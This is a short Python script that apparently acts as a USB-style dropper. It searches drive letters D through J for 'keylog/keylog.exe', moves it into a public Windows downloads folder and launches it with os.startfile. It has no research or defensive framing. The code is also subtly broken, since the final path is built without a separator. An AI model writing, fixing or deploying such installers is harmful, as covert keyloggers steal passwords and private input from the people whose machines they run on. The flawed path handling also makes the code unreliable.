import os.path, os
import shutil

#print(os.path.realpath(__file__))

save_path = 'C:/Users/Public/Public Downloads/Lan'
exe_path = ':/keylog/keylog.exe'

os.makedirs(save_path)

try:
    shutil.move('D'+exe_path, save_path)
except:
    try:
        shutil.move('E'+exe_path, save_path)
    except:
        try:
            shutil.move('F'+exe_path, save_path)
        except:
            try:
                shutil.move('G'+exe_path, save_path)
            except:
                try:
                    shutil.move('H'+exe_path, save_path)
                except:
                    try:
                        shutil.move('I'+exe_path, save_path)
                    except:
                        try:
                            shutil.move('J'+exe_path, save_path)
                        except:
                            print('error')

new_exe_path = save_path+'keylog.exe'
os.startfile(new_exe_path)